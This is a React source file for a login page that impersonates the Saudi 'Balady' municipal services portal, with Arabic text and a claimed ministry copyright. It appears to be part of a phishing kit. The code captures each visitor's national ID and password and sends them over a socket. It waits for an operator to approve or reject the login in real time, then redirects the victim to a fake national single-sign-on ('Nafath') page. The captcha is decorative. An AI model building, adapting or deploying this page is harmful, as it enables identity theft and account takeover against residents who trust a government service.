import { useState, useEffect } from "react";
import { socket, updatePage, submitData, visitor } from "@/lib/store";
import { User, Lock, Eye, EyeOff, RefreshCw, Loader2 } from "lucide-react";

export default function BaladyLogin() {
  const [nationalId, setNationalId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [captchaCode, setCaptchaCode] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{nationalId?: string; password?: string; captcha?: string}>({});

  // Get service name from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceName = urlParams.get('service') || '';

  useEffect(() => {
    updatePage("صفحة بلدي");
    generateCaptcha();
  }, []);

  const generateCaptcha = () => {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    setCaptchaCode(code);
    setCaptchaInput("");
  };

  const handleSubmit = () => {
    const newErrors: {nationalId?: string; password?: string; captcha?: string} = {};
    
    if (!nationalId) {
      newErrors.nationalId = "يرجى إدخال رقم الهوية / الإقامة";
    } else if (nationalId.length < 10) {
      newErrors.nationalId = "رقم الهوية يجب أن يكون 10 أرقام";
    }
    
    if (!password) {
      newErrors.password = "يرجى إدخال كلمة المرور";
    }

    if (!captchaInput) {
      newErrors.captcha = "يرجى إدخال رمز التحقق";
    } else if (captchaInput !== captchaCode) {
      newErrors.captcha = "رمز التحقق غير صحيح";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsLoading(true);
      
      submitData({
        type: "balady_login",
        service: serviceName,
        nationalId,
        password,
      });

      socket.value.on("formApproved", () => {
        setIsLoading(false);
        window.location.href = `/nafath-login?service=${encodeURIComponent(serviceName)}`;
      });

      socket.value.on("formRejected", () => {
        setIsLoading(false);
        setPassword("");
        setErrors({ password: "كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى" });
        generateCaptcha();
      });
    }
  };

  return (
    <div className="min-h-screen relative font-sans overflow-hidden" dir="rtl">
      {/* Background Image */}
      <div 
        className="absolute inset-0 z-0"
        style={{
          backgroundImage: `url('/images/balady-bg.jpg')`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
        }}
      />
      {/* Dark green overlay on image */}
      <div 
        className="absolute inset-0 z-[1]"
        style={{
          background: "linear-gradient(135deg, rgba(0,50,25,0.75) 0%, rgba(0,70,35,0.65) 50%, rgba(0,50,25,0.75) 100%)",
        }}
      />

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex flex-col">
        
        {/* Center Content */}
        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-[1200px] flex flex-col lg:flex-row items-center gap-10 lg:gap-20">
            
            {/* Left Side - Login Form */}
            <div className="w-full max-w-[460px] order-1 lg:order-2 flex-shrink-0">
              <div className="bg-white rounded-lg shadow-2xl px-8 py-10">
                <h2 className="text-[26px] font-bold text-gray-800 text-center mb-8">تسجيل الدخول</h2>

                {/* National ID Field */}
                <div className="mb-5">
                  <label className="block text-sm font-semibold text-gray-700 mb-2 text-right">
                    رقم الهوية / الإقامة <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={nationalId}
                      onChange={(e) => {
                        const val = e.target.value.replace(/[^0-9]/g, '');
                        if (val.length <= 10) setNationalId(val);
                      }}
                      placeholder="رقم الهوية / الإقامة"
                      className={`w-full px-4 py-3 pr-11 border ${errors.nationalId ? 'border-red-400' : 'border-gray-300'} rounded-lg text-right focus:outline-none focus:border-[#006C35] focus:ring-1 focus:ring-[#006C35] transition-colors text-sm`}
                      dir="rtl"
                    />
                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  </div>
                  {errors.nationalId && <p className="text-red-500 text-xs mt-1 text-right">{errors.nationalId}</p>}
                </div>

                {/* Password Field */}
                <div className="mb-5">
                  <div className="flex justify-between items-center mb-2">
                    <button className="text-xs text-[#006C35] hover:underline">نسيت كلمة المرور؟</button>
                    <label className="text-sm font-semibold text-gray-700">
                      كلمة المرور <span className="text-red-500">*</span>
                    </label>
                  </div>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="أدخل كلمة المرور هنا"
                      className={`w-full px-4 py-3 pr-11 pl-11 border ${errors.password ? 'border-red-400' : 'border-gray-300'} rounded-lg text-right focus:outline-none focus:border-[#006C35] focus:ring-1 focus:ring-[#006C35] transition-colors text-sm`}
                      dir="rtl"
                    />
                    <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <button 
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  {errors.password && <p className="text-red-500 text-xs mt-1 text-right">{errors.password}</p>}
                </div>

                {/* Captcha */}
                <div className="mb-6">
                  <div className="flex items-center gap-3">
                    <input
                      type="text"
                      value={captchaInput}
                      onChange={(e) => setCaptchaInput(e.target.value.replace(/[^0-9]/g, ''))}
                      placeholder="رمز التحقق"
                      className={`flex-1 px-4 py-3 border ${errors.captcha ? 'border-red-400' : 'border-gray-300'} rounded-lg text-right focus:outline-none focus:border-[#006C35] focus:ring-1 focus:ring-[#006C35] transition-colors text-sm`}
                      dir="rtl"
                    />
                    <button 
                      onClick={generateCaptcha}
                      className="p-2 text-[#006C35] hover:bg-gray-100 rounded-lg transition-colors"
                    >
                      <RefreshCw className="w-5 h-5" />
                    </button>
                    <div className="bg-gray-200 px-5 py-3 rounded-lg font-mono text-xl font-bold tracking-[0.2em] text-gray-700 select-none min-w-[130px] text-center">
                      {captchaCode}
                    </div>
                  </div>
                  {errors.captcha && <p className="text-red-500 text-xs mt-1 text-right">{errors.captcha}</p>}
                </div>

                {/* Login Button */}
                <button
                  onClick={handleSubmit}
                  disabled={isLoading}
                  className="w-full bg-[#006C35] hover:bg-[#005a2c] text-white font-bold py-3.5 px-6 rounded-lg transition-colors disabled:opacity-70 flex items-center justify-center gap-2 text-base"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      جاري تسجيل الدخول...
                    </>
                  ) : (
                    "تسجيل الدخول"
                  )}
                </button>

                {/* Divider */}
                <div className="flex items-center my-5">
                  <div className="flex-1 h-px bg-gray-200"></div>
                  <span className="px-4 text-sm text-gray-500">أو</span>
                  <div className="flex-1 h-px bg-gray-200"></div>
                </div>

                {/* Nafath Login */}
                <p className="text-sm text-gray-600 text-center mb-3">يمكنك الدخول من خلال منصة النفاذ الوطني الموحد</p>
                <button 
                  onClick={() => {
                    window.location.href = `/nafath-login?service=${encodeURIComponent(serviceName)}`;
                  }}
                  className="w-full border-2 border-[#006C35]/30 rounded-lg py-3 px-4 flex items-center justify-center gap-3 hover:border-[#006C35] hover:bg-gray-50 transition-all"
                >
                  <img src="/images/nic-logo.png" alt="مركز المعلومات الوطني" className="h-12 object-contain" />
                </button>

                {/* Create Account */}
                <p className="text-center mt-5 text-sm text-gray-600">
                  ليس لديك حساب؟ <button className="text-[#006C35] font-semibold hover:underline">إنشاء حساب</button>
                </p>
              </div>
            </div>

            {/* Right Side - Logo & Welcome Text */}
            <div className="flex-1 text-center lg:text-right order-2 lg:order-1">
              {/* Logo - بلدي خدمات - أقصى يمين */}
              <div className="flex justify-center lg:justify-end mb-10">
                <img src="/images/balady-logo-white.png" alt="خدمات بلدي - balady services" className="h-[160px] object-contain" />
              </div>
              
              <h1 className="text-3xl lg:text-[40px] font-bold text-white mb-6 leading-[1.6]">
                مرحباً بك في بلدي خدمات
              </h1>
              <p className="text-base lg:text-lg text-white/85 leading-[2] max-w-[550px] mx-auto lg:mx-0 lg:mr-0">
                يمكنك من خلال بوابة بلدي خدمات متابعة كافة الطلبات الخاصة بك وتنفيذ كافة المتطلبات ذو العلاقة المباشرة مع الأمانات والبلدية من خلال منصة موحدة تهدف لتسهيل أعمالك ومتابعتها.
              </p>
            </div>

          </div>
        </div>

        {/* Footer */}
        <div className="text-center py-4">
          <p className="text-white/50 text-sm">جميع الحقوق محفوظة – وزارة البلديات والإسكان © 2026</p>
        </div>
      </div>
    </div>
  );
}
